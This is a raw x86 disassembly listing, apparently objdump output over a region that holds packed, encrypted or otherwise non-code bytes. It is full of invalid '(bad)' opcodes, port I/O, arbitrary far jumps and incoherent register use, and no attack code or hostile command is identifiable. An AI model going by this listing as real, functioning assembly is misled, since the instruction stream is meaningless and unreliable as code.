  422545:	scas   eax,DWORD PTR es:[edi]
  422546:	retf   0x72aa
  422549:	ss push cs
  42254b:	sahf   
  42254c:	inc    edi
  42254d:	sub    eax,0xf3d54b3b
  422552:	xor    BYTE PTR [ebx],0x77
  422555:	rcr    DWORD PTR [ecx],1
  422557:	not    BYTE PTR [edi-0x17]
  42255a:	jmp    0xd3b4:0xc7482926
  422561:	adc    ecx,DWORD PTR [eax-0x6e]
  422564:	jb     0x4225a4
  422566:	sub    BYTE PTR [edx+0x490e422c],0xf6
  42256d:	dec    esp
  42256e:	pop    edi
  42256f:	jp     0x42250b
  422571:	dec    ebp
  422572:	sbb    eax,0xa263bff4
  422577:	jbe    0x4225a7
  422579:	mov    BYTE PTR [ecx+0x2c],dh
  42257c:	pop    ds
  42257d:	adc    eax,0x6d211437
  422582:	popa   
  422583:	jne    0x42250f
  422585:	mov    ds:0xbc8f50f8,al
  42258a:	ss cld 
  42258c:	cmp    DWORD PTR [ebx+ebx*4-0x71],ecx
  422590:	pop    ecx
  422591:	jge    0x42258c
  422593:	add    ebp,DWORD PTR [ebx-0x4c]
  422596:	push   eax
  422597:	mov    dh,0x6f
  422599:	adc    eax,0x32ce752d
  42259e:	loopne 0x4225a8
  4225a0:	shr    DWORD PTR [ebp-0x62],cl
  4225a3:	push   esp
  4225a4:	mov    ds:0x648ec8a7,eax
  4225a9:	scas   eax,DWORD PTR es:[edi]
  4225aa:	mov    esp,edi
  4225ac:	sbb    dl,BYTE PTR [ecx+ecx*4-0x70]
  4225b0:	gs xchg ebx,eax
  4225b2:	stos   BYTE PTR es:[edi],al
  4225b3:	dec    esi
  4225b4:	jge    0x4225af
  4225b6:	mov    ecx,0xcdc0693e
  4225bb:	in     eax,dx
  4225bc:	add    ebp,eax
  4225be:	mov    ah,0x4a
  4225c0:	pop    esi
  4225c1:	rol    BYTE PTR [esi],cl
  4225c3:	icebp  
  4225c4:	or     dh,al
  4225c6:	clc    
  4225c7:	scas   al,BYTE PTR es:[edi]
  4225c8:	loope  0x422613
  4225ca:	inc    esp
  4225cb:	cwde   
  4225cc:	ss xor ebp,esi
  4225cf:	or     dl,BYTE PTR [ecx]
  4225d1:	push   cs
  4225d2:	add    BYTE PTR [edx],cl
  4225d4:	mov    bl,0x2d
  4225d6:	sub    al,0x88
  4225d8:	sbb    eax,0x10d2855a
  4225dd:	push   ds
  4225de:	sub    eax,DWORD PTR [esi+edi*1-0x7fe3585f]
  4225e5:	ds mov ch,0xc8
  4225e8:	push   edx
  4225e9:	mov    esp,?
  4225eb:	xchg   edx,eax
  4225ec:	mov    ch,0x61
  4225ee:	ins    BYTE PTR es:[edi],dx
  4225ef:	loop   0x422582
  4225f1:	popf   
  4225f2:	mov    ebp,DWORD PTR [ecx+0x1146dee3]
  4225f8:	cmc    
  4225f9:	rcr    bl,1
  4225fb:	cmp    DWORD PTR [esp+edi*1-0x54e94c33],edx
  422602:	sti    
  422603:	scas   al,BYTE PTR es:[edi]
  422604:	clc    
  422605:	inc    eax
  422606:	ffree  st(5)
  422608:	jns    0x42261f
  42260a:	test   BYTE PTR [ecx+ecx*2-0x67],0x44
  42260f:	popa   
  422610:	add    al,0x33
  422612:	sub    ebx,DWORD PTR [eax]
  422614:	out    dx,eax
  422615:	fbld   TBYTE PTR [ebx-0x37dec008]
  42261b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42261c:	xor    DWORD PTR [eax+0x6e10b4f1],edx
  422622:	xchg   edi,eax
  422623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422624:	xchg   DWORD PTR ds:0x4760fbfc,ebp
  42262a:	and    bl,BYTE PTR [ebx-0x115e9dcf]
  422630:	cmp    ecx,DWORD PTR [esi+ecx*8+0x0]
  422634:	or     eax,0x39b07596
  422639:	cwde   
  42263a:	jge    0x4225c2
  42263c:	(bad)  
  42263d:	fisub  DWORD PTR [ecx+0x4648cb76]
  422643:	leave  
  422644:	cmp    DWORD PTR [eax-0x51],ecx
  422647:	xlat   BYTE PTR ds:[ebx]
  422648:	and    eax,0xa43fa887
  42264d:	and    bl,dl
  42264f:	sbb    eax,0xcaea5b3a
  422654:	pop    esi
  422655:	and    eax,0x4749255e
  42265a:	inc    edi
  42265b:	jge    0x4226db
  42265d:	rcr    DWORD PTR [ecx-0x67],1
  422660:	push   0xb706257f
  422665:	(bad)  
  422666:	retf   0x2a75
  422669:	or     dh,al
  42266b:	mov    ecx,0x43f16c2e
  422670:	pop    esi
  422671:	add    esi,esp
  422673:	jl     0x42269f
  422675:	mov    dl,0xb5
  422677:	sub    ebp,0x76
  42267a:	mov    ebp,DWORD PTR [ebp+0x1]
  42267d:	in     al,0x9c
  42267f:	ds clc 
  422681:	inc    edx
  422682:	jns    0x4226a9
  422684:	arpl   ax,sp
  422686:	les    ecx,FWORD PTR [esi+0x21]
  422689:	imul   edx,DWORD PTR [eax+0x55],0x32
  42268d:	(bad)  
  42268e:	ins    DWORD PTR es:[edi],dx
  42268f:	push   esi
  422690:	adc    esi,DWORD PTR [ebx]
  422692:	popf   
  422693:	fimul  DWORD PTR [esp+edx*8+0x12]
  422697:	inc    edi
  422698:	retf   
  422699:	mov    ebx,0x60a67326
  42269e:	stos   BYTE PTR es:[edi],al
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	ins    WORD PTR es:[edi],dx
  4226a2:	sbb    dl,ch
  4226a4:	(bad)  
  4226a5:	push   edx
  4226a6:	sbb    al,0xe2
  4226a8:	pop    edx
  4226a9:	mov    ebx,0x41593aa0
  4226ae:	sub    BYTE PTR [ecx+0x10],dl
  4226b1:	jno    0x4226c7
  4226b3:	jno    0x42263a
  4226b5:	pop    es
  4226b6:	sub    eax,0x697fb871
  4226bb:	lds    edi,FWORD PTR es:[ebp+0x19]
  4226bf:	loope  0x422734
  4226c1:	adc    DWORD PTR [edx-0x2],ebx
  4226c4:	and    eax,0x75c95e1c
  4226c9:	push   ecx
  4226ca:	ja     0x4226f9
  4226cc:	push   ss
  4226cd:	cli    
  4226ce:	dec    edi
  4226cf:	imul   ecx,DWORD PTR [edi],0xffffffe7
  4226d2:	jno    0x4226a7
  4226d4:	cmc    
  4226d5:	loopne 0x42273e
  4226d7:	ja     0x422701
  4226d9:	daa    
  4226da:	add    ah,ah
  4226dc:	ss push 0xffffffd7
  4226df:	pop    edi
  4226e0:	fstp   TBYTE PTR [edi-0x39350d6e]
  4226e6:	mov    BYTE PTR [eax],0xd1
  4226e9:	repnz xor al,0xbf
  4226ec:	lods   eax,DWORD PTR ds:[esi]
  4226ed:	xchg   ebx,eax
  4226ee:	mov    bh,0x70
  4226f0:	repz pushf 
  4226f2:	pop    edx
  4226f3:	sti    
  4226f4:	xchg   al,al
  4226f6:	sub    dh,BYTE PTR [edi-0x5bb95d0a]
  4226fc:	sub    al,0x64
  4226fe:	popa   
  4226ff:	sbb    eax,0xb5d180d6
  422704:	add    BYTE PTR [ebp-0x135a37a9],ah
  42270a:	je     0x42274b
  42270c:	sub    esp,DWORD PTR [eax-0x27aaa96b]
  422712:	stos   BYTE PTR es:[edi],al
  422713:	jmp    0x776c0a73
  422718:	aam    0x7c
  42271a:	push   esp
  42271b:	das    
  42271c:	ds jae 0x4226a0
  42271f:	std    
  422720:	(bad)
  422723:	sbb    eax,0xd6bec05c
  422728:	pop    ebp
  422729:	(bad)  
  42272a:	fnstsw WORD PTR [esi-0x5d]
  42272d:	fcomp  DWORD PTR [ecx+ebx*4]
  422730:	je     0x422792
  422732:	outs   dx,BYTE PTR ds:[esi]
  422733:	inc    esi
  422734:	jp     0x422794
  422736:	test   eax,0xdbcc711c
  42273b:	scas   eax,DWORD PTR es:[edi]
  42273c:	dec    edx
  42273d:	push   ebp
  42273e:	sbb    cl,BYTE PTR [edx+0xc]
  422741:	push   0x5c
  422743:	sub    eax,0xfc158296
  422748:	sub    al,0x4a
  42274a:	or     ebx,DWORD PTR [ebp-0x2d9d3f27]
  422750:	dec    edx
  422751:	test   al,0xa5
  422753:	adc    edi,eax
  422755:	jae    0x4226fa
  422757:	fisttp WORD PTR [ecx-0x1c748a21]
  42275d:	xchg   esi,eax
  42275e:	sub    edi,DWORD PTR [esp+ecx*8]
  422761:	ins    DWORD PTR es:[edi],dx
  422762:	push   edi
  422763:	xor    ch,bh
  422765:	sbb    eax,0xdb88c555
  42276a:	dec    ebx
  42276b:	mov    dl,0xee
  42276d:	(bad)
  422771:	jb     0x422758
  422773:	or     eax,0x9e95ac1c
  422778:	jbe    0x4227d9
  42277a:	fcom   DWORD PTR [ecx]
  42277c:	js     0x422756
  42277e:	(bad)  
  42277f:	loope  0x4227f2
  422781:	and    DWORD PTR [edi],eax
  422783:	pop    ecx
  422784:	jbe    0x42271f
  422786:	xchg   esi,eax
  422787:	xor    al,0x71
  422789:	jmp    0x7ef9:0x68be010
  422790:	mov    cl,0x67
  422792:	xchg   ebp,eax
  422793:	inc    ebp
  422794:	div    DWORD PTR [edx+0x6832f9a1]
  42279a:	daa    
  42279b:	mov    ds:0xc7676c1a,eax
  4227a0:	jge    0x4227f7
  4227a2:	cli    
  4227a3:	pop    esp
  4227a4:	xchg   esi,eax
  4227a5:	sub    eax,0x522d0ad6
  4227aa:	jbe    0x42275e
  4227ac:	jle    0x42280c
  4227ae:	retf   0xef51
  4227b1:	add    al,0x85
  4227b3:	icebp  
  4227b4:	dec    ecx
  4227b5:	cli    
  4227b6:	mov    dh,0x71
  4227b8:	jns    0x42282b
  4227ba:	and    al,0xb4
  4227bc:	ins    BYTE PTR es:[edi],dx
  4227bd:	inc    edx
  4227be:	pop    esi
  4227bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227c0:	fwait
  4227c1:	or     edx,DWORD PTR [edx]
  4227c3:	int    0xbb
  4227c5:	pop    ss
  4227c6:	repz icebp 
  4227c8:	adc    eax,0xdcecd5e4
  4227cd:	std    
  4227ce:	stos   DWORD PTR es:[edi],eax
  4227cf:	enter  0x2139,0xe9
  4227d3:	rol    edx,1
  4227d5:	fnstcw WORD PTR es:[esi+ebx*8]
  4227d9:	shl    BYTE PTR [edx-0x43],1
  4227dc:	mov    al,0x32
  4227de:	mov    esi,0xcd2caa0c
  4227e3:	ins    DWORD PTR es:[edi],dx
  4227e4:	stos   DWORD PTR es:[edi],eax
  4227e5:	repnz add edi,DWORD PTR [eax+0x454c24dc]
  4227ec:	fnsave [edi-0x33]
  4227ef:	mov    eax,0x91f1e98c
  4227f4:	lahf   
  4227f5:	jno    0x422852
  4227f7:	sub    DWORD PTR [ebp+0x6b71939d],esi
  4227fd:	inc    edi
  4227fe:	add    eax,0x27460fda
  422803:	cdq    
  422804:	outs   dx,DWORD PTR ds:[esi]
  422805:	xchg   BYTE PTR [eax],ah
  422807:	sar    DWORD PTR ds:0x8f13d2ec,cl
  42280e:	aam    0x1d
  422810:	(bad)  
  422812:	cmp    eax,0xb1a9688c
  422817:	mov    dh,0xdc
  422819:	sbb    al,BYTE PTR [ecx]
  42281b:	ins    BYTE PTR es:[edi],dx
  42281c:	test   dl,bh
  42281e:	push   edx
  42281f:	out    dx,eax
  422820:	nop
  422821:	in     eax,0x8e
  422823:	daa    
  422824:	fld    QWORD PTR [edx+0x8]
  422827:	aaa    
  422828:	cmp    al,0x9e
  42282a:	xlat   BYTE PTR ds:[ebx]
  42282c:	pusha  
  42282d:	xchg   esi,eax
  42282e:	(bad)  
  42282f:	fwait
  422830:	sbb    BYTE PTR [ecx],dl
  422832:	dec    esi
  422833:	(bad)  
  422834:	mov    ds:0xbb4adeca,eax
  422839:	mov    al,BYTE PTR [edi+0x5c]
  42283c:	dec    edx
  42283d:	(bad)  
  42283e:	pop    esi
  42283f:	or     dl,BYTE PTR [esi]
  422841:	cld    
  422842:	inc    eax
  422843:	sar    DWORD PTR [edi-0x78f90fac],cl
  422849:	retf   0xeca9
  42284c:	jae    0x422860
  42284e:	fidiv  DWORD PTR [esp+eiz*8-0x1f566d8c]
  422855:	test   al,0xe6
  422857:	imul   ebp,DWORD PTR [ecx+eax*8+0x7c],0xa0db6d0c
  42285f:	cmp    eax,esi
  422861:	stos   BYTE PTR es:[edi],al
  422862:	or     ecx,DWORD PTR [eax-0x42]
  422865:	xor    al,0xe8
  422867:	lods   eax,DWORD PTR ds:[esi]
  422868:	dec    DWORD PTR [ebp+0x5c]
  42286b:	xlat   BYTE PTR ds:[ebx]
  42286c:	sub    DWORD PTR ds:[edx-0xb],edx
  422870:	adc    BYTE PTR [ebx+0x2b],bh
  422873:	fisub  WORD PTR [esi]
  422875:	inc    edx
  422876:	adc    edx,DWORD PTR [eax-0xd]
  422879:	ins    BYTE PTR es:[edi],dx
  42287a:	mov    edx,0x3d12ab0f
  42287f:	scas   al,BYTE PTR es:[edi]
  422880:	ds jmp 0xfbcb0011
  422886:	pop    ds
  422887:	cmp    cl,BYTE PTR [esi+0x7e97c1ea]
  42288d:	in     eax,dx
  42288e:	jb     0x4228e9
  422890:	lock (bad) 
  422892:	call   0x7ea3617e
  422897:	sub    dl,BYTE PTR [edi+0x7854276a]
  42289d:	and    DWORD PTR [esi+eiz*8-0x74],ebx
  4228a1:	aas    
  4228a2:	ss ins BYTE PTR es:[edi],dx
  4228a4:	dec    eax
  4228a5:	xor    al,0x7b
  4228a7:	(bad)
  4228ab:	clc    
  4228ac:	(bad)  
  4228ad:	sub    al,0xc8
  4228af:	in     eax,dx
  4228b0:	out    dx,al
  4228b1:	cmp    al,0xc6
  4228b3:	scas   al,BYTE PTR es:[edi]
  4228b4:	sub    bl,BYTE PTR [ecx]
  4228b6:	(bad)  
  4228b7:	mov    dh,0x83
  4228b9:	and    eax,0xa74037c0
  4228be:	in     al,0x1d
  4228c0:	aam    0xd0
  4228c2:	in     al,0xc8
  4228c4:	add    DWORD PTR es:[edi+0x47],0x62
  4228c9:	dec    edi
  4228ca:	call   0xb6db:0x560a9976
  4228d1:	ss (bad) 
  4228d3:	das    
  4228d4:	cmp    DWORD PTR [ebp-0x2f],0x54f4c5cf
  4228db:	add    DWORD PTR [edx+0x71],ebx
  4228de:	fidivr DWORD PTR [ebx+0x72432727]
  4228e4:	or     al,0xb0
  4228e6:	sahf   
  4228e7:	and    eax,DWORD PTR [ecx+0x134a6f6a]
  4228ed:	popf   
  4228ee:	js     0x4228db
  4228f0:	push   ss
  4228f1:	adc    DWORD PTR [ebx-0x1948411d],edi
  4228f7:	jbe    0x42291d
  4228f9:	sbb    al,0x20
  4228fb:	cmp    DWORD PTR [eax],esp
  4228fd:	mov    ah,0x33
  4228ff:	mov    eax,0x3f9a9f73
  422904:	xchg   BYTE PTR [ebp+0x59fa9e08],cl
  42290a:	lahf   
  42290b:	pop    ebx
  42290c:	pop    ebx
  42290d:	cmp    esi,DWORD PTR [ebx+0xc]
  422910:	into   
  422911:	jae    0x422898
  422913:	sub    DWORD PTR [ebx+0x73f7ba0d],ecx
  422919:	jp     0x4228c0
  42291b:	dec    DWORD PTR [eax]
  42291d:	(bad)  [esi+0x57]
  422920:	ret    0x9b9f
  422923:	sar    DWORD PTR [esi+0x66809d80],cl
  422929:	retf   0x9813
  42292c:	(bad)  
  42292e:	fistp  QWORD PTR ds:[edx+eiz*2+0x1ce1b6ed]
  422936:	jno    0x4229ad
  422938:	mov    edi,cs
  42293a:	movsx  edi,ah
  42293d:	pop    esp
  42293e:	and    DWORD PTR [edi+0x2c7d51f7],0x3b
  422945:	(bad)  
  422947:	retf   0x639f
  42294a:	mov    eax,DWORD PTR [esp+edx*1-0x22]
  42294e:	sub    al,0x56
  422950:	jne    0x422905
  422952:	ret    
  422953:	sbb    ebp,ebx
  422955:	xor    eax,0x5a81ca52
  42295a:	jmp    0x4229a7
  42295c:	in     al,0x9b
  42295e:	and    ebx,eax
  422960:	int    0x6a
  422962:	push   esp
  422963:	add    edi,0xaae42153
  422969:	mov    DWORD PTR [eax-0xf320bbe],edi
  42296f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422970:	test   al,0xca
  422972:	jns    0x42291a
  422974:	jns    0x4229b3
  422976:	inc    esi
  422977:	test   al,0xfd
  422979:	fldenv [edx-0x1b]
  42297c:	(bad)  
  42297d:	mov    ss,edi
  42297f:	out    dx,al
  422980:	add    eax,0xc8633437
  422985:	leave  
  422986:	pop    ss
  422987:	popa   
  422988:	mov    esp,0xd558d3b5
  42298d:	jne    0x422a00
  42298f:	jbe    0x422940
  422991:	and    eax,0xa237763e
  422996:	enterw 0x9def,0x2a
  42299b:	inc    edx
  42299c:	dec    edx
  42299d:	xor    BYTE PTR [esi],cl
  42299f:	in     al,0x2f
  4229a1:	sbb    dl,dl
  4229a3:	mov    ds:0xd14964e9,eax
  4229a8:	cmp    eax,0x52084af7
  4229ad:	out    dx,al
  4229ae:	je     0x4229b0
  4229b0:	pop    ds
  4229b1:	into   
  4229b2:	xchg   esi,eax
  4229b3:	xchg   ebx,eax
  4229b4:	adc    ecx,esi
  4229b6:	into   
  4229b7:	into   
  4229b8:	call   0x4877523c
  4229bd:	(bad)  
  4229be:	jmp    0x4389871
  4229c3:	nop
  4229c4:	jno    0x422a0b
  4229c6:	iret   
  4229c7:	sub    DWORD PTR [ebx+0x50e97167],ebx
  4229cd:	aam    0xf4
  4229cf:	jmp    0x422a4f
  4229d1:	sti    
  4229d2:	and    BYTE PTR [ecx-0x41],dh
  4229d5:	daa    
  4229d6:	aas    
  4229d7:	or     BYTE PTR [ebx+0x714517a7],dh
  4229dd:	js     0x422a44
  4229df:	sbb    al,0x8d
  4229e1:	sub    al,0x9a
  4229e3:	icebp  
  4229e4:	outs   dx,DWORD PTR ds:[esi]
  4229e5:	das    
  4229e6:	inc    esi
  4229e7:	test   al,0xf4
  4229e9:	push   ebx
  4229ea:	daa    
  4229eb:	xor    dh,BYTE PTR [eax-0x20029127]
  4229f1:	in     eax,0xb3
  4229f3:	dec    ebp
  4229f4:	add    al,0x2a
  4229f6:	dec    edi
  4229f7:	outs   dx,DWORD PTR ds:[esi]
  4229f8:	lea    esi,[edx-0xa73edf3]
  4229fe:	mov    ebp,0x44e9c24e
  422a03:	mov    ds:0xebfbb83,al
  422a08:	cmp    edi,esi
  422a0a:	les    esp,FWORD PTR [ebp-0x2e]
  422a0d:	les    ebx,FWORD PTR [edi-0x772abb79]
  422a13:	test   DWORD PTR [edx+0xe],edx
  422a16:	mov    esp,0x4dec04e2
  422a1b:	jns    0x422a7d
  422a1d:	and    ah,dh
  422a1f:	pop    esp
  422a20:	pusha  
  422a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a22:	dec    edi
  422a23:	frstor [eax+0x8]
  422a26:	inc    esi
  422a27:	push   esi
  422a28:	adc    eax,0xbe8ee635
  422a2d:	mov    bh,0x82
  422a2f:	sub    eax,0x1c91d025
  422a34:	push   edx
  422a35:	sbb    BYTE PTR [ebp-0x13],al
  422a38:	loope  0x4229c2
  422a3a:	push   0x73
  422a3c:	and    ebx,DWORD PTR [esi+0x5e]
  422a3f:	stc    
  422a40:	xchg   edx,eax
  422a41:	cld    
  422a42:	sbb    ch,BYTE PTR [esp+edx*4]
  422a45:	xor    DWORD PTR [ecx],ebp
  422a47:	data16 xlat BYTE PTR ds:[ebx]
  422a49:	sbb    al,0xc8
  422a4b:	sbb    al,0x98
  422a4d:	sbb    BYTE PTR [eax],bh
  422a4f:	sbb    edi,ebp
  422a51:	adc    esi,edx
  422a53:	and    al,0x54
  422a55:	jae    0x422a03
  422a57:	mov    ch,0x6e
  422a59:	pop    ecx
  422a5a:	ins    BYTE PTR es:[edi],dx
  422a5b:	fsub   DWORD PTR [eax-0x3f52787a]
  422a61:	lock and BYTE PTR [ecx-0x60de2941],cl
  422a68:	cli    
  422a69:	xchg   DWORD PTR [ecx],eax
  422a6b:	cmp    ah,BYTE PTR [edx+ebp*8-0xd]
  422a6f:	jge    0x422ace
  422a71:	and    BYTE PTR [esi-0x265b46aa],ch
  422a77:	int3   
  422a78:	pop    ecx
  422a79:	and    al,0x6b
  422a7b:	into   
  422a7c:	cmp    DWORD PTR [eax],ebx
  422a7e:	jmp    0x422a83
  422a80:	mov    esi,0xa1309fac
  422a85:	pusha  
  422a86:	xlat   BYTE PTR ds:[ebx]
  422a87:	mov    ah,0xe9
  422a89:	xchg   DWORD PTR [ebx+0x505c0ee0],edi
  422a8f:	out    dx,eax
  422a90:	add    DWORD PTR [ebx-0x47fa85d3],esi
  422a96:	sub    DWORD PTR [ebp-0x45ce3722],ebp
  422a9c:	das    
  422a9d:	jbe    0x422aad
  422a9f:	adc    al,0xa5
  422aa1:	mov    cl,0xb8
  422aa3:	out    0x7,eax
  422aa5:	mov    al,0x1e
  422aa7:	sbb    DWORD PTR [eax],esp
  422aa9:	jg     0x422b26
  422aab:	lods   eax,DWORD PTR ds:[esi]
  422aac:	and    al,0x6f
  422aae:	and    eax,0x721166ab
  422ab3:	repz jg 0x422a84
  422ab6:	sahf   
  422ab7:	shr    ebx,cl
  422ab9:	jb     0x422ad7
  422abb:	dec    edi
  422abc:	fimul  DWORD PTR [ecx+0x59090bfb]
  422ac2:	das    
  422ac3:	adc    al,0x40
  422ac5:	mov    ds:0xd6814181,al
  422aca:	xor    eax,0x2530a379
  422acf:	and    DWORD PTR [ebx],esi
  422ad1:	iret   
  422ad2:	jb     0x422a9a
  422ad4:	sbb    al,0xce
  422ad6:	sar    BYTE PTR [esi-0x7e],cl
  422ad9:	ins    DWORD PTR es:[edi],dx
  422ada:	(bad)  
  422adb:	sti    
  422adc:	xchg   esi,eax
  422add:	mov    al,ds:0xbaa1e8ca
  422ae2:	or     al,0xb0
  422ae4:	mov    ds:0x1737ea5b,eax
  422ae9:	aas    
  422aea:	or     BYTE PTR [eax-0x6],ah
  422aed:	dec    eax
  422aee:	add    BYTE PTR [ecx+0x3b7ad371],bl
  422af4:	call   0x6fb6d6c5
  422af9:	and    al,0xf8
  422afb:	nop
  422afc:	push   ecx
  422afd:	jge    0x422ab6
  422aff:	cmp    al,0xb4
  422b01:	adc    ax,0x76d4
  422b05:	(bad)  
  422b06:	ins    BYTE PTR es:[edi],dx
  422b07:	mov    eax,0xd41d42ad
  422b0c:	je     0x422b5c
  422b0e:	bound  esi,QWORD PTR [ecx+ecx*4-0x70a4530b]
  422b15:	pop    eax
  422b16:	sbb    DWORD PTR [esi+0x56],edi
  422b19:	or     eax,0x313c2f2b
  422b1e:	retf   0xd2c2
  422b21:	test   al,0xbc
  422b23:	outs   dx,BYTE PTR ds:[esi]
  422b24:	clc    
  422b25:	daa    
  422b26:	ja     0x422b02
  422b28:	sbb    eax,0x949bf3c7
  422b2d:	jno    0x422b59
  422b2f:	or     al,0xd4
  422b31:	mov    edx,0xb8e91989
  422b36:	loopne 0x422ba4
  422b38:	mov    ecx,0xa4ad30f6
  422b3d:	retf   
  422b3e:	ds mov ebp,0x84d4bfb1
  422b44:	mov    DWORD PTR [esi],ebx
  422b46:	or     DWORD PTR [edx-0xe0143e6],eax
  422b4c:	stos   BYTE PTR es:[edi],al
  422b4d:	fstp   TBYTE PTR [esi]
  422b4f:	(bad)  [ecx+0x1ca04cb3]
  422b55:	mov    al,0x4c
  422b57:	ins    DWORD PTR es:[edi],dx
  422b58:	mov    al,ah
  422b5a:	(bad)  [eax+0x3d4798d9]
  422b60:	cmp    edi,DWORD PTR [eax+0x1e]
  422b63:	dec    edx
  422b64:	mov    gs:0x4ad1e6be,al
  422b6a:	subps  xmm0,xmm2
  422b6d:	ss in  al,dx
  422b6f:	out    dx,al
  422b70:	xchg   DWORD PTR [ebx],ecx
  422b72:	sub    edi,DWORD PTR [edi+0x2d930913]
  422b78:	int    0x1e
  422b7a:	push   ebp
  422b7b:	jnp    0x422b08
  422b7d:	rol    ebx,0x87
  422b80:	(bad)  
  422b81:	in     al,0x4
  422b83:	jp     0x422b80
  422b85:	mov    cl,0xb4
  422b87:	lods   al,BYTE PTR ds:[esi]
  422b88:	fcom   QWORD PTR [edx+0x5b]
  422b8b:	add    eax,0x7d42cd48
  422b90:	test   al,0x14
  422b92:	pop    ds
  422b93:	jb     0x422bb8
  422b95:	xchg   ecx,eax
  422b96:	popa   
  422b97:	bnd jb 0x422b4c
  422b9a:	adc    dh,BYTE PTR [ecx-0x619db820]
  422ba0:	ror    BYTE PTR [edi-0x1cf266b3],cl
  422ba6:	test   BYTE PTR [ebx],ch
  422ba8:	mov    ebx,0x6f077afc
  422bad:	xchg   edx,eax
  422bae:	cmp    eax,0xa50ac662
  422bb3:	adc    BYTE PTR [ebp+0x31],ah
  422bb6:	jg     0x422b9f
  422bb8:	mov    al,0x26
  422bba:	fldenv [edi]
  422bbc:	jp     0x422be8
  422bbe:	inc    eax
  422bbf:	sbb    BYTE PTR ds:0x97f46260,al
  422bc5:	rcl    BYTE PTR [ebx-0x74],cl
  422bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bc9:	mov    eax,ds:0xac4392c9
  422bce:	lods   eax,DWORD PTR ds:[esi]
  422bcf:	nop
  422bd0:	jbe    0x422bbc
  422bd2:	cld    
  422bd3:	lods   al,BYTE PTR ds:[esi]
  422bd4:	test   BYTE PTR [ebp-0x3b],ch
  422bd7:	sahf   
  422bd8:	and    al,0xaf
  422bda:	sbb    al,0xaf
  422bdc:	or     DWORD PTR [ecx+0x36],ebp
  422bdf:	inc    edx
  422be0:	dec    ecx
  422be1:	pushf  
  422be2:	jo     0x422bcf
  422be4:	test   eax,0xd06f96da
  422be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bea:	ins    BYTE PTR es:[edi],dx
  422beb:	(bad)  
  422bec:	cld    
  422bed:	add    al,0x67
  422bef:	pop    es
  422bf0:	fwait
  422bf1:	xor    eax,edx
  422bf3:	sub    eax,eax
  422bf5:	sub    ecx,DWORD PTR [ecx]
  422bf7:	mov    ch,0xf
  422bf9:	jo     0x422bfd
  422bfb:	pop    eax
  422bfc:	in     al,dx
  422bfd:	int    0x93
  422bff:	add    eax,0xe4d19858
  422c04:	xchg   ebx,eax
  422c05:	add    BYTE PTR [ebp-0x25],bh
  422c08:	ffree  st(6)
  422c0a:	xor    eax,DWORD PTR [edi+eax*4]
  422c0d:	rol    DWORD PTR [edx-0x29],1
  422c10:	mov    al,0xce
  422c12:	or     eax,0x9991c8d0
  422c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c18:	add    DWORD PTR [esi+0x65],edi
  422c1b:	int3   
  422c1c:	sbb    BYTE PTR [edi],al
  422c1e:	adc    ebx,DWORD PTR [ebx+0x66]
  422c21:	push   0xc590d004
  422c26:	inc    esp
  422c27:	rol    BYTE PTR [edx+0x73],cl
  422c2a:	es aad 0x24
  422c2d:	clc    
  422c2e:	ror    BYTE PTR [ebx-0x4d5c9075],1
  422c34:	mov    eax,ds:0x45337e6
  422c39:	lock in al,dx
  422c3b:	mov    bh,0xa9
  422c3d:	sbb    esp,DWORD PTR [ecx+0x5a01f6c2]
  422c43:	int    0x11
  422c45:	fmul   QWORD PTR [edx+edi*4+0x63]
  422c49:	xor    eax,0xa37efa0f
  422c4e:	add    esp,DWORD PTR [ebp-0x47]
  422c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c52:	les    edi,FWORD PTR [ebx-0x32]
  422c55:	ins    BYTE PTR es:[edi],dx
  422c56:	xor    ebx,DWORD PTR [edi+0x7b154102]
  422c5c:	dec    esi
  422c5d:	lods   eax,DWORD PTR ds:[esi]
  422c5e:	sub    al,BYTE PTR [ebp-0x2f20799e]
  422c64:	and    ebp,DWORD PTR [edi-0x7fa803ae]
  422c6a:	(bad)  
  422c6b:	cld    
  422c6c:	xor    ebx,DWORD PTR [esi-0x442ddf5a]
  422c72:	or     DWORD PTR [edi],eax
  422c74:	mov    bl,0xd5
  422c76:	fwait
  422c77:	loopne 0x422c0d
  422c79:	inc    edi
  422c7a:	xor    al,BYTE PTR [edi-0x1c4a06ef]
  422c80:	inc    edx
  422c81:	in     eax,dx
  422c82:	arpl   WORD PTR [eax],di
  422c84:	test   al,0xa8
  422c86:	xor    DWORD PTR [edx-0x6b],ebx
  422c89:	jnp    0x422c67
  422c8b:	out    dx,eax
  422c8c:	sbb    BYTE PTR [esi],dh
  422c8e:	and    DWORD PTR [ebp+0x25d84bdc],ecx
  422c94:	or     al,0xef
  422c96:	sbb    dl,bl
  422c98:	sahf   
  422c99:	mov    ah,0x2
  422c9b:	pop    eax
  422c9c:	imul   esi,DWORD PTR [esi-0x7dc44eba],0xfffffff0
  422ca3:	mov    eax,ds:0xf36316fb
  422ca8:	js     0x422c57
  422caa:	mov    ch,0xf4
  422cac:	shl    BYTE PTR [esi],cl
  422cae:	mov    eax,0x8029e603
  422cb3:	inc    ebx
  422cb4:	push   esp
  422cb5:	jecxz  0x422cc5
  422cb7:	jno    0x422cbc
  422cb9:	add    al,dl
  422cbb:	pop    edi
  422cbc:	mul    edi
  422cbe:	mov    dl,0xd0
  422cc0:	sbb    DWORD PTR [edi],edx
  422cc2:	mov    ah,0x46
  422cc4:	or     DWORD PTR [ebx+0x37ebaeb],ebp
  422cca:	mov    ds:0x16d055b4,al
  422ccf:	xor    al,0xf8
  422cd1:	shl    BYTE PTR [edx+0x6b0fd581],cl
  422cd7:	arpl   sp,bp
  422cd9:	dec    esi
  422cda:	jge    0x422d19
  422cdc:	xor    al,BYTE PTR [ebx]
  422cde:	inc    ebx
  422cdf:	push   esp
  422ce0:	arpl   WORD PTR [edx+0x2f98decf],si
  422ce6:	lods   al,BYTE PTR ds:[esi]
  422ce7:	inc    ebx
  422ce8:	and    ch,BYTE PTR [eax+0x0]
  422ceb:	jle    0x422ce4
